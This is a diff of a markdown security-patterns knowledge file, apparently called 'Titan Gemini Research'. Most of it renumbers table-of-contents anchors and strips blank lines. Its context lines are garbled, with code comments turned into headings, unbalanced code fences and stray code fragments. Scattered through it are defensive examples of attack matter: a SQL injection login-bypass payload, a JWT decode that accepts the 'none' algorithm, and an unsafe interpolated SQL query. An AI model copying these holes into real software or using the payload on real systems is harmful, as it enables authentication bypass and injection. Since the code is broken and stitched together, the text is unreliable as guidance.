   - [Session Management](#session-management)
 - [NETWORK SECURITY DEEP ATLAS](#network-security-deep-atlas)
@@ -14229,7 +13205,7 @@ value: "2024-01-01T00:00:00Z"
   - [Data Encryption at Rest](#data-encryption-at-rest)
 - [API KEY MANAGEMENT](#api-key-management)
   - [Secure API Key Generation](#secure-api-key-generation)
-- [SECURITY HEADERS](#security-headers-1)
+- [SECURITY HEADERS](#security-headers-3)
   - [Helmet Configuration](#helmet-configuration)
     - [CONTINUED: MORE SECURITY PATTERNS](#continued-more-security-patterns)
 - [DEFENSE](#defense)
@@ -14258,8 +13234,8 @@ value: "2024-01-01T00:00:00Z"
 - [Refresh Token Pattern](#refresh-token-pattern)
 - [Token Revocation](#token-revocation)
 - [?? SECURITY LOGGING](#-security-logging)
-- [What to Log](#what-to-log-1)
-- [Log Format](#log-format-1)
+- [What to Log](#what-to-log)
+- [Log Format](#log-format-3)
 - [Alerting Thresholds](#alerting-thresholds)
 - [?? INPUT VALIDATION PATTERNS](#-input-validation-patterns)
 - [Zod Schema Validation](#zod-schema-validation)
@@ -14267,7 +13243,7 @@ value: "2024-01-01T00:00:00Z"
 - [Sanitization](#sanitization-1)
 - [?? SECURE SESSION MANAGEMENT](#-secure-session-management)
 - [Session ID Generation](#session-id-generation)
-- [Cookie Settings](#cookie-settings-1)
+- [Cookie Settings](#cookie-settings)
 - [Session Fixation Prevention](#session-fixation-prevention)
 - [Idle Timeout](#idle-timeout)
 - [?? SECURITY HEADERS DEEP DIVE](#-security-headers-deep-dive)
@@ -14300,13 +13276,13 @@ value: "2024-01-01T00:00:00Z"
 - [?? ACCOUNT SECURITY PATTERNS](#-account-security-patterns)
 - [Login Attempt Tracking](#login-attempt-tracking)
 - [Suspicious Activity Detection](#suspicious-activity-detection)
-- [Session Security](#session-security-1)
+- [Session Security](#session-security-3)
 - [?? OAUTH 2.0 DEEP DIVE](#-oauth-20-deep-dive)
 - [PKCE Flow (for SPAs and Mobile)](#pkce-flow-for-spas-and-mobile)
-- [Token Storage](#token-storage-1)
+- [Token Storage](#token-storage-3)
 - [Silent Refresh](#silent-refresh)
 - [JWT SECURITY PATTERNS](#jwt-security-patterns)
-- [Token Structure](#token-structure-1)
+- [Token Structure](#token-structure)
 - [Access + Refresh Tokens](#access-refresh-tokens)
 - [Security Checklist](#security-checklist)
 - [AUTHENTICATION FLOW PATTERNS](#authentication-flow-patterns)
@@ -14316,15 +13292,15 @@ value: "2024-01-01T00:00:00Z"
 - [Types of XSS](#types-of-xss)
 - [Prevention (React)](#prevention-react)
 - [Prevention (Backend)](#prevention-backend)
-- [ENVIRONMENT VARIABLES](#environment-variables-1)
+- [ENVIRONMENT VARIABLES](#environment-variables-2)
 - [Environment Setup](#environment-setup)
 - [Validation with Zod](#validation-with-zod)
-- [Security Rules](#security-rules-1)
-- [CSRF PROTECTION](#csrf-protection-1)
+- [Security Rules](#security-rules-3)
+- [CSRF PROTECTION](#csrf-protection)
 - [What is CSRF?](#what-is-csrf)
 - [Prevention: Token Pattern](#prevention-token-pattern)
 - [For SPAs: Double Submit Cookie](#for-spas-double-submit-cookie)
-- [COOKIE SECURITY](#cookie-security-1)
+- [COOKIE SECURITY](#cookie-security-2)
 - [Secure Cookie Settings](#secure-cookie-settings)
 - [SameSite Explained](#samesite-explained)
 - [Cookie vs localStorage](#cookie-vs-localstorage)
@@ -14384,7 +13360,7 @@ value: "2024-01-01T00:00:00Z"
 - [TIMING ATTACKS AGAINST STRING COMPARISON](#timing-attacks-against-string-comparison)
   - [The Scar](#the-scar)
 - [UNICODE NORMALIZATION ATTACKS](#unicode-normalization-attacks)
-  - [The Scar](#the-scar-1)
+  - [The Scar](#the-scar-3)
 - [END OF VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS](#end-of-volume-17-titan-gemini-research---advanced-attack-patterns)
 - [VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION](#volume-2-titan-gemini-research---auth-and-secrets-production)
   - [JWT SECURITY PITFALLS](#jwt-security-pitfalls)
@@ -14392,13 +13368,11 @@ value: "2024-01-01T00:00:00Z"
 - [API KEY ROTATION](#api-key-rotation)
   - [The Scar](#the-scar-3)
 
-
 ## ?? ADVANCED SECURITY PATTERNS
 
 > **The patterns that protect applications**
 
 ---
-
 
 ## ?? AUTHENTICATION DEEP DIVE
 
@@ -14406,13 +13380,11 @@ value: "2024-01-01T00:00:00Z"
 
 ---
 
-
 ## ?? INPUT VALIDATION
 
 > **The patterns for secure data handling**
 
 ---
-
 
 ## ?? CORS EXPLAINED
 
@@ -14420,13 +13392,11 @@ value: "2024-01-01T00:00:00Z"
 
 ---
 
-
 ## ?? ENCRYPTION PATTERNS
 
 > **The patterns for protecting data**
 
 ---
-
 
 ## ?? API SECURITY CHECKLIST
 
@@ -14434,13 +13404,11 @@ value: "2024-01-01T00:00:00Z"
 
 ---
 
-
 ## ?? ZERO TRUST SECURITY
 
 > **The patterns for modern security**
 
 ---
-
 
 ## ?? CONTENT SECURITY POLICY
 
@@ -14448,13 +13416,11 @@ value: "2024-01-01T00:00:00Z"
 
 ---
 
-
 ## ?? API KEY PATTERNS
 
 > **The secure API key implementation**
 
 ---
-
 
 ## ?? OAUTH 2.0 FLOWS
 
@@ -14462,13 +13428,11 @@ value: "2024-01-01T00:00:00Z"
 
 ---
 
-
 ## ?? SUBDOMAIN TAKEOVER PREVENTION
 
 > **The DNS security patterns**
 
 ---
-
 
 ## ?? RATE LIMIT BYPASS PREVENTION
 
@@ -14476,13 +13440,11 @@ value: "2024-01-01T00:00:00Z"
 
 ---
 
-
 ## ?? SECURE FILE UPLOAD
 
 > **The patterns for safe file handling**
 
 ---
-
 
 ## ?? DEPENDENCY SCANNING
 
@@ -14490,13 +13452,11 @@ value: "2024-01-01T00:00:00Z"
 
 ---
 
-
 ## ?? CSRF PREVENTION PATTERNS
 
 > **The cross-site request forgery protection**
 
 ---
-
 
 ## ?? XSS PREVENTION PATTERNS
 
@@ -14504,13 +13464,11 @@ value: "2024-01-01T00:00:00Z"
 
 ---
 
-
 ## ?? SECURE HEADERS CONFIGURATION
 
 > **The HTTP security headers**
 
 ---
-
 
 ## AUTHENTICATION
 
@@ -14526,7 +13484,6 @@ value: "2024-01-01T00:00:00Z"
 
 - Passkeys: credential manager, cross-device
 
-
 ## AUTHORIZATION
 
 - RBAC: roles, permissions, inheritance
@@ -14541,10 +13498,10 @@ value: "2024-01-01T00:00:00Z"
 
 - Zero trust: never trust, always verify
 
-
 ## INPUT VALIDATION
 
 ```typescript
+
 import { z } from 'zod';
 
 // ? TITAN: Validate ALL user input
@@ -14584,9 +13541,7 @@ size: z.number().max(5 * 1024 * 1024),  // 5MB max
 
 ---
 
-
 ## SECURITY HEADERS
-
 
 ## ?? SECURITY - PENETRATION TESTING
 
@@ -14594,13 +13549,11 @@ size: z.number().max(5 * 1024 * 1024),  // 5MB max
 
 ---
 
-
 ## ?? INCIDENT RESPONSE PLAYBOOK
 
 > **The security incident handling**
 
 ---
-
 
 ## ?? SECRETS ROTATION
 
@@ -14608,13 +13561,11 @@ size: z.number().max(5 * 1024 * 1024),  // 5MB max
 
 ---
 
-
 ## ?? AUTHENTICATION PATTERNS
 
 > **The auth implementation patterns**
 
 ---
-
 
 ## ?? SECURITY LOGGING
 
@@ -14622,13 +13573,11 @@ size: z.number().max(5 * 1024 * 1024),  // 5MB max
 
 ---
 
-
 ## ?? INPUT VALIDATION PATTERNS
 
 > **The data sanitization patterns**
 
 ---
-
 
 ## ?? SECURE SESSION MANAGEMENT
 
@@ -14636,13 +13585,11 @@ size: z.number().max(5 * 1024 * 1024),  // 5MB max
 
 ---
 
-
 ## ?? SECURITY HEADERS DEEP DIVE
 
 > **The essential HTTP security headers**
 
 ---
-
 
 ## ?? PASSWORD SECURITY
 
@@ -14650,13 +13597,11 @@ size: z.number().max(5 * 1024 * 1024),  // 5MB max
 
 ---
 
-
 ## ?? API AUTHENTICATION PATTERNS
 
 > **The secure API access patterns**
 
 ---
-
 
 ## ?? RBAC IMPLEMENTATION
 
@@ -14664,13 +13609,11 @@ size: z.number().max(5 * 1024 * 1024),  // 5MB max
 
 ---
 
-
 ## ?? MFA IMPLEMENTATION
 
 > **Multi-factor authentication patterns**
 
 ---
-
 
 ## ?? SECURITY SCANNING
 
@@ -14678,11 +13621,9 @@ size: z.number().max(5 * 1024 * 1024),  // 5MB max
 
 ---
 
-
 ## Dependency Scanning
 
 ```bash
-
 
 ## ?? ACCOUNT SECURITY PATTERNS
 
@@ -14690,13 +13631,11 @@ size: z.number().max(5 * 1024 * 1024),  // 5MB max
 
 ---
 
-
 ## ?? OAUTH 2.0 DEEP DIVE
 
 > **The authorization patterns**
 
 ---
-
 
 ## ENVIRONMENT VARIABLES
 
@@ -14704,33 +13643,26 @@ size: z.number().max(5 * 1024 * 1024),  // 5MB max
 
 ---
 
-
 ## COOKIE SECURITY
 
 > **The session patterns that don't get hacked**
 
 ---
 
-
 ## Query: SELECT * FROM users WHERE email = 'admin'--'
-
 
 ## Password check bypassed!
 
-
 ## Log4j downloads and executes attacker's code!
 
-
 ## VULNERABLE: algorithms not specified!
+
 payload = jwt.decode(token, secret_key)  # Accepts 'none'!
 return payload
 
-
 ## 3. Server verifies with same "secret" = valid signature!
 
-
 ## Attacker can detect the difference!
-
 
 ## TITAN: Constant-time comparison
 
@@ -14739,33 +13671,29 @@ import secrets
 
 def verify_api_key(provided_key: str, stored_key: str) -> bool:
 
-
 ## With input: 'a' * 30 + '!'
 
-
 ## Converts l, a, III, etc.
+
 normalized = unicodedata.normalize('NFKC', username)
 
-
 ## Don't use .lower() for security comparisons!
+
 import icu  # PyICU
 return icu.UnicodeString(text).toLower(icu.Locale(locale))
 
 ```text
 
-
 ## ? WRONG: [...nextAuth].ts (capital A)
-
 
 ## ? CORRECT: [...nextauth].ts (lowercase)
 
-
 ## Git might not track case-only changes!
-
 
 ## SQL Injection Prevention
 
 ```typescript
+
 // NEVER do this
 const query = `SELECT * FROM users WHERE id = ${userId}`;
 
@@ -14788,10 +13716,10 @@ const validatedId = userIdSchema.parse(userId);
 
 ---
 
-
 ## XSS Prevention
 
 ```typescript
+
 // React auto-escapes by default
 function SafeComponent({ userContent }: { userContent: string }) {
 return <div>{userContent}</div>; // Safe - auto-escaped
@@ -14835,10 +13763,10 @@ connect-src 'self' https://api.example.com;
 
 ---
 
-
 ## CSRF Protection
 
 ```typescript
+
 // csrf.ts - CSRF token generation and validation
 import { randomBytes, createHmac } from 'crypto';
 
@@ -14891,3 +13819,5 @@ return res.status(403).json({ error: 'Invalid CSRF token' });
 ```text
 
 ---
+
+```
